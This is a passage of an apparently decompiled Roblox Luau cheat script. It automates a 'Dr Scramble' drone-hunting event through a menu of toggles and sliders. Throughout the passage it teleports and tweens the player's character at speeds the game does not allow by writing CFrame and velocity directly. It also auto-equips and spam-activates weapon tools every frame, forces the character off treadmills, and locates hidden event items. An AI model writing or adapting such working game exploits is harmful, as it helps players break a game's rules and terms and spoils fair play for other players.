			if hitbox and hitbox:IsA("BasePart") then
				return hitbox.Position
			end

			if v14 and v14.PrimaryPart then
				return v14.PrimaryPart.Position
			end
			return arg.Position
		end

		local fn44

		fn44 = function()
			local tbl28 = {}
			local now = os.clock()

			for k, v14 in pairs(tbl9) do
				local flag4 = v14.Tier == nil or v14.Tier == "" or tbl26[v14.Tier] == true

				if flag4 then
					flag4 = (tonumber(v14.Health) or 0) > 0
				end

				flag4 = flag4 and v14.Position

				if flag4 then
					flag4 = (tbl12[k] or 0) <= now
				end

				if flag4 then
					tbl28[#tbl28 + 1] = v14
				end
			end

			return tbl28
		end

		local fn45

		fn45 = function()
			local v14 = fn24()
			if not v14 then
				return nil
			end
			local huge = math.huge
			local v15 = nil

			for _, v16 in ipairs(fn44()) do
				local magnitude = ((fn43(v16) or v16.Position) - v14.Position).Magnitude
				local v17 = str3

				if v17 == "Rare First" then
					if v16.Tier == "AugmentedDrone" then
						magnitude -= 200000
					elseif v16.Tier == "ReactorDrone" then
						magnitude -= 100000
					end
				elseif v17 == "Most HP First" then
					magnitude -= (tonumber(v16.Health) or 0) * 100000
				end

				if magnitude < huge then
					huge = magnitude
					v15 = v16
				end
			end

			return v15
		end

		local fn46

		do
			local function fn47()
				local v14 = fn24()
				if not v14 then
					return nil, nil
				end
				local serverTimeNow = workspace:GetServerTimeNow()
				local huge = math.huge
				local v15 = nil
				local v16 = nil

				for k, v17 in pairs(tbl10) do
					if v17.ExpiresAt and v17.ExpiresAt < serverTimeNow then
						tbl10[k] = nil
					else
						local magnitude = (v17.Position - v14.Position).Magnitude

						if v17.Kind == "Part" then
							magnitude -= 100000
						end

						if magnitude < huge then
							huge = magnitude
							v15 = k
							v16 = v17
						end
					end
				end

				return v15, v16
			end

			fn13 = function()
				if not tbl22.Link then
					if tbl22.SwapWait then
						tbl22.SwapWait = nil
						tbl4.Shield("scramble", false)
					end

					return
				end

				tbl22.Link:Disconnect()
				local v14 = tbl22
				local v15 = tbl22
				local v16 = tbl22
				tbl22.Link = nil
				v14.Goal = nil
				v15.Look = nil
				v16.Character = nil
				local v17 = tbl22
				local v18 = tbl22
				local v19 = tbl22
				local v20 = tbl22
				tbl22.Track = nil
				v17.Dir = nil
				v18.Last = nil
				v19.LastAt = nil
				v20.Vel = nil
				tbl4.Driving = math.max(0, tbl4.Driving - 1)
				tbl4.Shield("scramble", false)
			end

			fn4(fn13)

			fn46 = function(goal, look, track)
				if track ~= tbl22.Track then
					local v14 = tbl22
					local v15 = tbl22
					tbl22.Last = nil
					v14.LastAt = nil
					v15.Vel = nil
				end

				local v14 = tbl22
				local v15 = tbl22
				tbl22.Goal = goal
				v14.Look = look
				v15.Track = track
				local character = localPlayer.Character

				if tbl22.Link and tbl22.Character ~= character then
					fn13()
					local v16 = tbl22
					local v17 = tbl22
					tbl22.Goal = goal
					v16.Look = look
					v17.Track = track
				end

				if tbl22.Link or not character then
					return
				end

				if not tbl4.Swapped() then
					tbl4.Shield("scramble", true)
					tbl22.SwapWait = tbl22.SwapWait or os.clock() + 6
					local swapWait = tbl22.SwapWait
					if os.clock() < swapWait then
						str = "Waiting for the character to settle"
						return
					end
				end

				if tbl22.SwapWait then
					tbl22.SwapWait = nil
				else
					tbl4.Shield("scramble", true)
				end

				tbl22.Character = character
				tbl4.Driving = tbl4.Driving + 1

				tbl22.Link = RunService.Heartbeat:Connect(function(deltaTime)
					local v16 = tbl4.Root()
					local goal2 = tbl22.Goal
					if not v16 or not goal2 or v16.Parent ~= tbl22.Character or tbl4.AntiGuard.Busy or tbl4.Movement.Owner ~= "scramble" then
						return
					end
					local position = v16.Position

					if tbl22.Track then
						local ok, last = pcall(tbl22.Track)

						if ok and typeof(last) == "Vector3" then
							local now = os.clock()

							if not tbl22.Last or not tbl22.LastAt then
								local v17 = tbl22
								tbl22.Last = last
								v17.LastAt = now
							elseif (last - tbl22.Last).Magnitude > 0.01 then
								local n22 = math.max(now - tbl22.LastAt, 0.0041666666666666666)
								local n23 = (last - tbl22.Last) / n22

								if n23.Magnitude < 400 then
									local n24 = math.clamp(n22 * 12, 0.2, 0.8)
									tbl22.Vel = tbl22.Vel and tbl22.Vel:Lerp(n23, n24) or n23
								end

								local v17 = tbl22
								tbl22.Last = last
								v17.LastAt = now
							elseif now - tbl22.LastAt > 0.25 and tbl22.Vel then
								tbl22.Vel = tbl22.Vel:Lerp(Vector3.zero, math.clamp(deltaTime * 6, 0, 1))
							end

							local vel = tbl22.Vel or Vector3.zero
							local look2 = tbl22.Last + vel * (math.clamp(now - tbl22.LastAt, 0, 0.25) + 0.1)
							local vector = Vector3.new(position.X - look2.X, 0, position.Z - look2.Z)

							if vector.Magnitude > 0.5 then
								local unit = vector.Unit
								local n22 = math.clamp(deltaTime * 5, 0, 1)
								local dir = tbl22.Dir and tbl22.Dir:Lerp(unit, n22) or unit
								tbl22.Dir = dir.Magnitude > 0.01 and dir.Unit or unit
							end

							goal2 = look2 + (tbl22.Dir or Vector3.new(0, 0, 1)) * n11 + Vector3.new(0, -1, 0)
							local v17 = tbl22
							tbl22.Goal = goal2
							v17.Look = look2

							if (goal2 - position).Magnitude <= 40 then
								local n22 = math.max(deltaTime, 0.0041666666666666666)
								local n23 = vel + (goal2 - position) / math.max(0.1, n22)
								local n24 = math.max(n9, vel.Magnitude + 80)

								if n24 < n23.Magnitude then
									n23 = n23.Unit * n24
								end

								local assemblyLinearVelocity = n23 + Vector3.new(0, workspace.Gravity * n22 * 0.5, 0)
								local vector2 = Vector3.new(look2.X - position.X, 0, look2.Z - position.Z)

								pcall(function()
									if vector2.Magnitude > 0.05 then
										v16.CFrame = CFrame.lookAt(position, position + vector2.Unit)
									end

									v16.AssemblyLinearVelocity = assemblyLinearVelocity
									v16.AssemblyAngularVelocity = Vector3.zero
								end)

								return
							end
						end
					end

					local vector

					if Vector3.new(goal2.X - position.X, 0, goal2.Z - position.Z).Magnitude > 250 then
						local n22 = math.max(n14, goal2.Y)
						vector = position.Y < n22 - 2 and Vector3.new(position.X, n22, position.Z) or Vector3.new(goal2.X, n22, goal2.Z)
					else
						vector = goal2
					end

					local n22 = vector - position
					local n23 = n9 * deltaTime
					vector = n22.Magnitude <= n23 and vector or position + n22.Unit * n23
					local look2 = tbl22.Look or goal2
					local vector2 = Vector3.new(look2.X - vector.X, 0, look2.Z - vector.Z)
					local cframe = vector2.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, vector2.Unit) or v16.CFrame.Rotation

					pcall(function()
						v16.CFrame = CFrame.new(vector) * cframe
						v16.AssemblyLinearVelocity = Vector3.zero
						v16.AssemblyAngularVelocity = Vector3.zero
					end)
				end)
			end

			local function fn48(arg)
				if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
					return false
				end
				local attribute = arg:GetAttribute("GearName")
				local gears = tbl.Gears
				local directory = type(gears) == "table" and gears.Directory or nil
				local flag4 = type(attribute) == "string" and type(directory) == "table" and directory[attribute] or nil
				return type(flag4) == "table" and (flag4.ToolController == "Slap" or flag4.SlapPower ~= nil)
			end

			local function fn49(arg)
				if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
					return false
				end

				if tostring(arg:GetAttribute("ItemType")) ~= "Gear" then
					return false
				end
				local str5 = tostring(arg:GetAttribute("GearName") or "")
				if str5 == "" then
					return false
				end
				return string.find(string.lower(str5), "scrambler", 1, true) ~= nil
			end

			local function fn50()
				return localPlayer.Character, localPlayer:FindFirstChildOfClass("Backpack")
			end

			local function fn51()
				local v14 = tbl4.FindBat()
				if v14 then
					return v14
				end
				local v15, v16 = fn50()

				for _, v17 in ipairs({ v15, v16 }) do
					if v17 then
						for _, child in ipairs(v17:GetChildren()) do
							if fn48(child) or fn49(child) then
								return child
							end
						end
					end
				end

				return nil
			end

			tbl19.Valid = function(arg)
				if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
					return false
				end
				return tbl4.IsBatTool(arg) or fn48(arg) or fn49(arg)
			end

			tbl19.Owned = function(arg)
				if typeof(arg) ~= "Instance" or not arg:IsA("Tool") then
					return false
				end
				local v14, v15 = fn50()
				local parent = arg.Parent
				return parent ~= nil and (parent == v14 or parent == v15)
			end

			tbl19.Name = function(arg)
				if fn49(arg) then
					return "The Scrambler"
				end
				return tostring(arg:GetAttribute("GearName") or arg.Name)
			end

			tbl19.Put = function(arg, arg2, parent)
				local equipAt = tbl19.EquipAt
				if os.clock() - equipAt < 0.4 then
					return false
				end
				tbl19.EquipAt = os.clock()

				pcall(function()
					arg2:EquipTool(arg)
				end)

				if arg.Parent ~= parent then
					pcall(function()
						arg.Parent = parent
					end)
				end

				return arg.Parent == parent
			end

			local function fn52()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
				if not character or not humanoid or humanoid.Health <= 0 then
					return nil, false
				end
				local tool = character:FindFirstChildWhichIsA("Tool")

				if tool ~= nil and tbl19.Valid(tool) then
					tbl19.Tool = tool
					str2 = tbl19.Name(tool)
					return tool, true
				end

				if not tbl19.Owned(tbl19.Tool) then
					tbl19.Tool = fn51()
				end

				local tool2 = tbl19.Tool
				if not tool2 then
					str2 = ""
					return nil, false
				end
				str2 = tbl19.Name(tool2)
				tbl19.Put(tool2, humanoid, character)
				return tool2, tool2.Parent == character
			end

			local function fn53()
				local v14, v15 = fn52()

				if v14 and v15 then
					if flag3 then
						pcall(function()
							v14:Activate()
						end)

						task.defer(function()
							pcall(function()
								v14:Deactivate()
							end)
						end)
					else
						pcall(function()
							v14:Deactivate()
							v14:Activate()
						end)
					end
				end

				return v14 ~= nil
			end

			local function fn54()
				local v14, v15 = fn50()
				local v16 = nil
				local v17 = nil
				local v18 = nil

				for _, v19 in ipairs({ v14, v15 }) do
					if v19 then
						for _, child in ipairs(v19:GetChildren()) do
							if tbl19.Valid(child) then
								if fn49(child) then
									v16 = v16 or child
								elseif tbl4.IsBatTool(child) and (v17 == nil or not tbl4.IsBatTool(v17)) then
									if v18 then
										v17 = child
									else
										v18 = v17
										v17 = child
									end
								elseif v17 == nil then
									v17 = child
								elseif v18 == nil then
									v18 = child
								end
							end
						end
					end
				end

				return v17, v16 or v18
			end

			local function fn55(arg)
				pcall(function()
					arg:Activate()
				end)

				task.defer(function()
					pcall(function()
						arg:Deactivate()
					end)
				end)
			end

			tbl20.SpamUntil = 0
			tbl20.List = {}
			tbl20.Dirty = true
			tbl20.BuiltAt = 0
			tbl20.NextBag = 0
			tbl20.Links = {}

			tbl20.Click = function(arg)
				pcall(arg.Deactivate, arg)
				pcall(arg.Activate, arg)
			end

			tbl20.Rebuild = function()
				tbl20.Dirty = false
				tbl20.BuiltAt = os.clock()
				table.clear(tbl20.List)
				local v14, v15 = fn50()

				for _, v16 in ipairs({ v14, v15 }) do
					if v16 then
						for _, child in ipairs(v16:GetChildren()) do
							if tbl19.Valid(child) then
								tbl20.List[#tbl20.List + 1] = child
							end
						end
					end
				end
			end

			tbl20.Beat = RunService.Heartbeat:Connect(function()
				local now = os.clock()
				if now >= tbl20.SpamUntil then
					return
				end

				if tbl20.Dirty or now - tbl20.BuiltAt > 1 then
					tbl20.Rebuild()
				end

				local character = localPlayer.Character
				local flag4 = now >= tbl20.NextBag

				if flag4 then
					tbl20.NextBag = now + 0.25
				end

				for _, v14 in ipairs(tbl20.List) do
					local parent = v14.Parent

					if parent == character then
						tbl20.Click(v14)
					elseif flag4 and parent ~= nil then
						tbl20.Click(v14)
					end
				end
			end)

			tbl20.Unwatch = function()
				for i = #tbl20.Links, 1, -1 do
					pcall(function()
						tbl20.Links[i]:Disconnect()
					end)

					tbl20.Links[i] = nil
				end
			end

			tbl20.Watch = function(arg)
				tbl20.Unwatch()
				tbl20.Dirty = true
				if not arg then
					return
				end

				tbl20.Links[#tbl20.Links + 1] = arg.ChildAdded:Connect(function(child)
					if not child:IsA("Tool") then
						return
					end
					tbl20.Dirty = true
					local spamUntil = tbl20.SpamUntil

					if os.clock() < spamUntil and tbl19.Valid(child) then
						tbl20.Click(child)
						task.defer(tbl20.Click, child)
					end
				end)

				tbl20.Links[#tbl20.Links + 1] = arg.ChildRemoved:Connect(function(child)
					if child:IsA("Tool") then
						tbl20.Dirty = true
					end
				end)

				task.defer(function()
					local backpack = localPlayer:FindFirstChildOfClass("Backpack") or localPlayer:WaitForChild("Backpack", 5)

					if backpack and localPlayer.Character == arg then
						tbl20.Links[#tbl20.Links + 1] = backpack.ChildAdded:Connect(function()
							tbl20.Dirty = true
						end)

						tbl20.Links[#tbl20.Links + 1] = backpack.ChildRemoved:Connect(function()
							tbl20.Dirty = true
						end)
					end
				end)
			end

			tbl20.Watch(localPlayer.Character)
			tbl20.CharLink = localPlayer.CharacterAdded:Connect(tbl20.Watch)

			fn4(function()
				tbl20.SpamUntil = 0
				tbl20.Unwatch()

				for _, v14 in ipairs({ "Beat", "CharLink" }) do
					if tbl20[v14] then
						pcall(function()
							tbl20[v14]:Disconnect()
						end)

						tbl20[v14] = nil
					end
				end
			end)

			local function fn56()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildWhichIsA("Humanoid")
				if not character or not humanoid or humanoid.Health <= 0 then
					return false
				end
				local v14, v15 = fn54()
				if not v14 or not v15 then
					return fn53()
				end
				local tbl28 = { v14, v15 }
				local tbl29 = { n12, n13 }
				local v16 = tbl28[tbl20.Index]

				if tbl20.Tool ~= v16 then
					local v17 = tbl20
					local v18 = tbl20
					local now = os.clock()
					v17.Tool = v16
					v18.Since = now
				end

				local flag4 = v16.Parent == character

				if flag4 then
					local since = tbl20.Since
					flag4 = os.clock() - since >= tbl29[tbl20.Index]
				end

				if flag4 then
					tbl20.Index = tbl20.Index == 1 and 2 or 1
					v16 = tbl28[tbl20.Index]
					local v17 = tbl20
					local v18 = tbl20
					local now = os.clock()
					v17.Tool = v16
					v18.Since = now
				end

				tbl19.Tool = v16
				str2 = tbl19.Name(v16)

				if v16.Parent ~= character then
					pcall(function()
						humanoid:EquipTool(v16)
					end)

					if v16.Parent ~= character then
						pcall(function()
							v16.Parent = character
						end)
					end

					tbl20.Since = os.clock()

					if v16.Parent == character then
						fn55(v16)
						task.defer(fn55, v16)
					end

					return true
				end

				fn55(v16)
				return true
			end

			local function fn57(arg, arg2, arg3)
				local now = os.clock()
				local n22 = now + n17

				while os.clock() < n22 and not arg() do
					local v14, v15 = fn47()
					local flag4 = not v15

					if not flag4 then
						if arg2 then
							flag4 = (v15.Position - arg2).Magnitude > (arg3 or 40)
						else
							flag4 = arg2
						end
					end

					if flag4 then
						if arg2 and os.clock() - now < 1.2 then
							task.wait(0.1)
							continue
						end
						return
					end

					if fn30() and not fn30(v15.Position) then
						fn13()
						str = "Leaving the base through the safe zone"
						if not fn33(v15.Position + Vector3.new(0, 2.5, 0), arg, 6) then
							return
						end
						continue
					end

					str = v15.Kind == "Part" and "Picking up a Drone Part" or "Picking up Samples"
					fn46(v15.Position + Vector3.new(0, 2.5, 0), v15.Position)
					local n23 = os.clock() + 2.5

					while tbl10[v14] and os.clock() < n23 and not arg() do
						task.wait(0.1)
					end

					tbl10[v14] = nil
					n22 = os.clock() + 1.2
				end
			end

			local function fn58(arg, arg2)
				local now = os.clock()
				local n22 = tonumber(arg.Health) or 0
				local now2 = nil
				local now3 = nil
				local fn59 = nil
				local flag4 = false

				while not arg2() do
					local v14 = tbl9[arg.Id]
					local flag5 = not v14
					local flag6

					if flag5 then
						flag6 = flag5
					else
						flag6 = (tonumber(v14.Health) or 0) <= 0
					end

					if flag6 then
						return true
					end
					local v15 = fn41(arg.Id)
					if v15 and v15:GetAttribute("DroneState") == "Death" then
						tbl9[arg.Id] = nil
						return true
					end
					local v16 = fn24()
					local flag7 = v16 ~= nil and v14.Position ~= nil

					if flag7 then
						flag7 = (v16.Position - (fn43(v14) or v14.Position)).Magnitude <= 30
					end

					if flag7 and not v15 then
						now2 = now2 or os.clock()
						if os.clock() - now2 > 1.5 then
							tbl9[arg.Id] = nil
							return false
						end
					else
						now2 = nil
					end

					local n23 = tonumber(v14.Health) or 0

					if n23 ~= n22 then
						now3 = nil
						n22 = n23
					end

					if n16 < os.clock() - now then
						tbl12[arg.Id] = os.clock() + 30
						return false
					end
					local position = fn43(v14) or v14.Position
					local v17 = fn24()
					if not v17 then
						return false
					end

					if fn30() and not fn30(position) then
						fn13()
						str = "Leaving the base through the safe zone"
						if not fn33(position, arg2, 12) then
							return false
						end

						if arg2() then
							return false
						end
					end

					if not fn59 then
						local v18 = nil
						local isBasePart = nil

						fn59 = function()
							local v19 = tbl9[arg.Id]
							if not v19 then
								return nil
							end

							if not v18 or not v18.Parent then
								v18 = fn41(arg.Id)
								local hitbox = v18 and v18:FindFirstChild("Hitbox")
								isBasePart = hitbox and hitbox:IsA("BasePart") and hitbox or v18 and v18.PrimaryPart or nil
							end

							if isBasePart and isBasePart.Parent then
								return isBasePart.Position
							end
							return v19.Position
						end
					end

					if flag3 then
						fn46(position + Vector3.new(0, -1, n11), position, fn59)
					else
						fn46(position + Vector3.new(0, -1, 5), position)
					end

					if (v17.Position - position).Magnitude <= 60 and not flag3 then
						fn52()
					end

					local flag8 = (v17.Position - position).Magnitude <= (flag3 and math.max(12, n11 + 7) or 12)

					if flag8 then
						if flag3 then
							tbl20.SpamUntil = os.clock() + 0.2
						end

						now3 = now3 or os.clock()
						if os.clock() - now3 > 8 then
							tbl12[arg.Id] = os.clock() + 30
							return false
						end

						if flag3 and fn56() or not flag3 and fn53() then
							str = string.format("Smashing %s  %d HP", v14.Tier ~= "" and v14.Tier or "drone", math.max(0, tonumber(v14.Health) or 0))
						elseif not flag4 then
							str = "No bat found, get any bat to smash drones"
							flag4 = true
						end
					else
						str = "Flying to a drone"
					end

					local wait = task.wait
					local v18 = flag3

					if not flag3 then
						flag8 = v18
					end

					wait(flag8 and 0.03 or 0.1)
				end

				return false
			end

			local function fn59(arg)
				for _, v14 in ipairs(tbl21) do
					if arg() then
						return false
					end
					str = "Looking for drones"
					fn46(v14)
					local n22 = os.clock() + 12

					while os.clock() < n22 and not arg() do
						fn42()
						if #fn44() > 0 then
							return true
						end

						if tbl4.DistanceTo(v14) < 8 then
							break
						end
						task.wait(0.2)
					end
				end

				return #fn44() > 0
			end

			local function fn60()
				local serverTimeNow = workspace:GetServerTimeNow()
				local v14, v15 = fn10()
				if v14 and v15 and v15 < 25 then
					return next(tbl10) ~= nil
				end

				for _, v16 in pairs(tbl10) do
					if v16.Kind == "Part" or v16.ExpiresAt and v16.ExpiresAt - serverTimeNow < 30 then
						return true
					end
				end

				return false
			end

			local v14 = nil

			local function fn61()
				local window = type(snapshot) == "table" and snapshot.Window or nil
				return type(window) == "table" and window.Index or nil
			end

			local function fn62(arg)
				local flag4 = v14 ~= nil and v14 == fn61()

				while not arg() do
					RunService.Heartbeat:Wait()

					if not arg() then
						fn42()

						if fn60() then
							fn57(arg)
						end

						local v15, flag5, flag6, v16, flag7, v17, position, v18, magnitude, flag8, v19, flag9, flag10, flag11, vector, n22, n23, v20, n24, flag12, flag13

						if fn30() then
							fn13()

							if fn32(arg) then
								v15 = fn45()
								flag5 = not v15 and next(tbl10) ~= nil

								if flag5 then
									fn57(arg)
									fn42()
									v15 = fn45()
								end

								if not v15 then
									flag6 = not fn10()
									v16 = flag6 or flag4

									if not v16 then
										v14 = fn61()
										flag7 = true
										flag4 = true

										if not fn59(arg) then
											break
										else
											continue
										end
									end
								else
									v17 = fn43(v15)
									position = v17 or v15.Position
									v18 = fn24()
									magnitude = v18 and (v18.Position - position).Magnitude or 0
									flag8 = str4 == "Teleport"
									v19 = flag8 and v18

									if v19 then
										flag9 = fn30() and not fn30(position)
										flag10 = not flag9
									else
										flag10 = v19
									end

									if flag10 then
										flag11 = magnitude > n15 and magnitude <= n18 and os.clock() >= n20 and os.clock() - n21 >= n19

										if flag11 then
											n21 = os.clock()
											vector = Vector3.new
											n22 = flag3 and n11 or 5
											n23 = position + vector(0, -1, n22)
											fn46(n23, position)
											v20 = fn24()

											if v20 then
												str = "Teleporting to the next drone"

												pcall(function()
													v20.CFrame = CFrame.lookAt(n23, Vector3.new(position.X, n23.Y, position.Z))
													v20.AssemblyLinearVelocity = Vector3.zero
													v20.AssemblyAngularVelocity = Vector3.zero
												end)

												n24 = os.clock() + 0.8

												while true do
													flag12 = os.clock() < n24 and not arg()

													if flag12 then
														flag13 = fn24()
														flag13 = flag13 and (flag13.Position - n23).Magnitude > 40

														if flag13 then
															n20 = os.clock() + 30
															str = "Teleport pulled back, tweening"
															break
														else
															RunService.Heartbeat:Wait()
															continue
														end
													end

													break
												end
											end
										end
									end

									fn58(v15, arg)
									continue
								end
							end
						else
							v15 = fn45()
							flag5 = not v15 and next(tbl10) ~= nil

							if flag5 then
								fn57(arg)
								fn42()
								v15 = fn45()
							end

							if not v15 then
								flag6 = not fn10()
								v16 = flag6 or flag4

								if not v16 then
									v14 = fn61()
									flag7 = true
									flag4 = true

									if not fn59(arg) then
										break
									else
										continue
									end
								end
							else
								v17 = fn43(v15)
								position = v17 or v15.Position
								v18 = fn24()
								magnitude = v18 and (v18.Position - position).Magnitude or 0
								flag8 = str4 == "Teleport"
								v19 = flag8 and v18

								if v19 then
									flag9 = fn30() and not fn30(position)
									flag10 = not flag9
								else
									flag10 = v19
								end

								if flag10 then
									flag11 = magnitude > n15 and magnitude <= n18 and os.clock() >= n20 and os.clock() - n21 >= n19

									if flag11 then
										n21 = os.clock()
										vector = Vector3.new
										n22 = flag3 and n11 or 5
										n23 = position + vector(0, -1, n22)
										fn46(n23, position)
										v20 = fn24()

										if v20 then
											str = "Teleporting to the next drone"

											pcall(function()
												v20.CFrame = CFrame.lookAt(n23, Vector3.new(position.X, n23.Y, position.Z))
												v20.AssemblyLinearVelocity = Vector3.zero
												v20.AssemblyAngularVelocity = Vector3.zero
											end)

											n24 = os.clock() + 0.8

											while true do
												flag12 = os.clock() < n24 and not arg()

												if flag12 then
													flag13 = fn24()
													flag13 = flag13 and (flag13.Position - n23).Magnitude > 40

													if flag13 then
														n20 = os.clock() + 30
														str = "Teleport pulled back, tweening"
														break
													else
														RunService.Heartbeat:Wait()
														continue
													end
												end

												break
											end
										end
									end
								end

								fn58(v15, arg)
								continue
							end
						end
					end

					break
				end

				fn57(arg)
				fn13()
			end

			local tbl28 = { LostPart1 = "Mechanical Gear", LostPart2 = "Wiring Harness" }

			tbl4.ScrambleLostPart = function(arg)
				return fn22(fn21(), arg)
			end

			fn14 = function()
				local v15 = fn21()
				if not v15 then
					return "Lost Parts: no event data"
				end
				local drScrambleEvent = workspace:FindFirstChild("DrScrambleEvent")
				local tbl29 = {}
				local n22 = 0
				local n23 = 0

				for _, v16 in ipairs(tbl15) do
					local v17 = drScrambleEvent and drScrambleEvent:FindFirstChild(v16)

					if v17 then
						n22 += 1
					end

					if fn22(v15, v16) then
						n23 += 1
					elseif v17 then
						local ok, result = pcall(v17.GetPivot, v17)
						ok = ok and tbl4.DistanceTo(result.Position) or nil
						tbl29[#tbl29 + 1] = ok and string.format("%s %d studs", tbl28[v16], math.floor(ok)) or tbl28[v16]
					else
						tbl29[#tbl29 + 1] = tbl28[v16] .. " not on map"
					end
				end

				local str5 = string.format("Lost Parts on map %d/2  -  Collected %d/2", n22, n23)
				local str6

				if #tbl29 > 0 then
					str6 = str5 .. "  -  " .. table.concat(tbl29, "  -  ")
				else
					str6 = str5
				end

				return str6
			end

			local function fn63(arg)
				if not fn29() then
					return true
				end
				local Exit = fn27("Exit")
				local v15 = fn28(Exit, nil)
				if not v15 then
					return false
				end
				str = "Leaving the Secret Cave"
				if not fn25(v15, arg, 4) then
					return false
				end

				for i = 1, 4 do
					if arg() then
						return false
					end
					fn26(Exit or fn27("Exit"))
					local n22 = os.clock() + 1.5

					while os.clock() < n22 and fn29() do
						RunService.Heartbeat:Wait()
					end

					if not fn29() then
						return true
					end
				end

				return not fn29()
			end

			local function fn64()
				return tbl4.IsNight() or tbl4.WallSealed()
			end

			local function fn65(arg)
				if not fn64() then
					return true
				end
				fn13()

				while fn64() and not arg() do
					str = tbl4.IsNight() and "Night, waiting for the wall to drop" or "Waiting for the wall to drop"
					RunService.Heartbeat:Wait()
				end

				return not arg()
			end

			fn15 = function()
				if not tbl4.Toggle(v11, false) or not fn9() then
					return false
				end

				if tbl11.Ended then
					return false
				end

				if fn10() then
					return true
				end
				fn42()
				return #fn44() > 0 or next(tbl10) ~= nil
			end

			fn16 = function()
				local v15 = fn21()
				if not v15 or v15.Completed == true or not fn9() then
					return false
				end
				local num = tonumber(v15.TotalParts)

				if not num then
					num = fn23(v15) + (tonumber(v15.DroneParts) or 0)
				end

				local flag4 = tbl4.Toggle(v12, false)

				if flag4 then
					local n22 = #tbl15
					flag4 = fn23(v15) < n22
				end

				local flag5 = tbl4.Toggle(v13, false) and (num >= 5 or v15.Discovered ~= true)
				return flag4 or flag5
			end

			fn17 = function(arg)
				local function fn66()
					return arg ~= n6 or tbl4.Movement.Owner ~= "scramble"
				end

				local function fn67()
					return fn66() or not fn15() or fn64()
				end

				while true do
					if fn15() and not fn66() then
						if fn65(fn66) then
							pcall(fn62, fn67)
							if fn64() then
								continue
							end
						end
					end

					break
				end

				fn13()
				if fn66() or fn15() then
					return
				end

				if not fn16() then
					fn34(fn66)
					str = ""
					return
				end

				if not fn65(fn66) then
					return
				end
				fn8(true)
				local v15 = fn21()
				if not v15 then
					return
				end

				if not fn16() then
					str = ""
					return
				end

				if tbl4.Toggle(v13, false) and v15.Discovered ~= true then
					pcall(fn36, fn66)
				end

				if tbl4.Toggle(v12, false) then
					pcall(fn37, function()
						return fn66() or not tbl4.Toggle(v12, false) or fn15() or fn64()
					end)
				end

				if tbl4.Toggle(v13, false) then
					pcall(fn38, function()
						return fn66() or not tbl4.Toggle(v13, false) or fn15() or fn64()
					end)
				end

				if fn29() and not fn66() then
					pcall(fn63, fn66)
				end

				if not fn29() and not fn15() then
					pcall(fn34, fn66)
				end
			end
		end

		fn18 = function(arg)
			if not (tbl4.Treadmill.Riding or tbl4.OnBelt()) then
				return true
			end

			for i = 1, 3 do
				if arg() then
					return false
				end
				str = "Jumping off the treadmill"
				tbl4.Treadmill.Riding = false
				task.spawn(tbl4.LeaveBelt)
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid then
					pcall(function()
						humanoid.Sit = false
						humanoid.Jump = true
						humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
					end)
				end

				local v14 = fn24()

				if v14 then
					local position = v14.Position
					local n22 = position + Vector3.new(0, 18, 0)
					local now = os.clock()

					while true do
						RunService.Heartbeat:Wait()
						local v15 = fn24()

						if not v15 then
							break
						else
							local n23 = math.min(1, (os.clock() - now) / 0.25)

							pcall(function()
								local rotation = v15.CFrame.Rotation
								v15.CFrame = CFrame.new(position:Lerp(n22, n23)) * rotation
								v15.AssemblyLinearVelocity = Vector3.zero
								v15.AssemblyAngularVelocity = Vector3.zero
							end)

							if not (n23 >= 1) then
								continue
							end
							break
						end
					end
				end

				if not (tbl4.Treadmill.Riding or tbl4.OnBelt()) then
					return true
				end
			end

			return not tbl4.OnBelt()
		end

		fn19 = function()
			if flag or not tbl4.ClaimMovement("scramble") then
				return
			end
			flag = true
			n6 += 1
			local v14 = n6

			local function fn47()
				return v14 ~= n6 or tbl4.Movement.Owner ~= "scramble"
			end

			fn18(fn47)
			tbl4.HoldBelt()

			pcall(function()
				fn8(false)
				fn35(fn47)
			end)

			str = ""
			tbl4.ReleaseBelt()
			tbl4.ReleaseMovement("scramble")
			tbl19.Tool = nil
			tbl19.EquipAt = 0
			local v15 = tbl20
			local v16 = tbl20
			tbl20.Index = 1
			v15.Since = 0
			v16.Tool = nil
			flag = false
			tbl3.Wake()
		end

		v8 = v6:CreateText({ Name = "Scramble Status", Text = "Loading Dr Scramble data..." })

		v11 = v6:CreateToggle({
			Name = "Auto Hunt Drones",
			Note = "Kill drones during outbreaks for Samples and Drone Parts",
			Default = false,
			Callback = function()
				n6 += 1
				str = ""
				n7 = 0
				tbl3.Wake()
			end,
		})

		v6:CreateDropdown({
			Name = "Hunt Priority",
			Options = tbl25,
			Default = tbl25[1],
			SubOf = v11,
			Callback = function(arg)
				str3 = tostring(arg)
			end,
		})

		fn6(v6:CreateMultiDropdown({
			Name = "Drone Types",
			Options = tbl24,
			Default = tbl24,
			SubOf = v11,
			Callback = function(arg)
				local tbl28 = {}

				if type(arg) == "table" then
					for k, v14 in pairs(arg) do
						k = v14 == true and type(k) == "string" and k

						if not k then
							k = type(v14) == "string" and v14 or nil
						end

						for _, v15 in ipairs(tbl23) do
							if v15.Label == k then
								tbl28[v15.Tier] = true
							end
						end
					end
				end

				tbl26 = tbl28
			end,
		}))

		v6:CreateDropdown({
			Name = "Hunt Travel Method",
			Note = "Teleport only to drones within 110 studs, farther ones are tweened",
			Options = tbl27,
			Default = tbl27[1],
			SubOf = v11,
			Callback = function(arg)
				str4 = tostring(arg)
			end,
		})

		v6:CreateSlider({
			Name = "Hunt Tween Speed",
			Min = 100,
			Max = 1000,
			Default = 400,
			Increment = 10,
			Unit = "studs/s",
			SubOf = v11,
			Callback = function(arg)
				n9 = math.clamp(tonumber(arg) or 400, 100, 1000)
			end,
		})

		local v14 = nil

		v14 = v6:CreateToggle({
			Name = "Swap Two Weapons",
			Default = false,
			SubOf = v11,
			Callback = function()
				flag3 = tbl4.Toggle(v14, false) == true
				local v15 = tbl20
				local v16 = tbl20
				tbl20.Index = 1
				v15.Since = 0
				v16.Tool = nil

				if not flag3 then
					tbl20.SpamUntil = 0
				end
			end,
		})

		v6:CreateSlider({
			Name = "Drone Distance",
			Min = 2,
			Max = 60,
			Default = 16,
			Increment = 0.1,
			AllowDecimals = true,
			Unit = "studs",
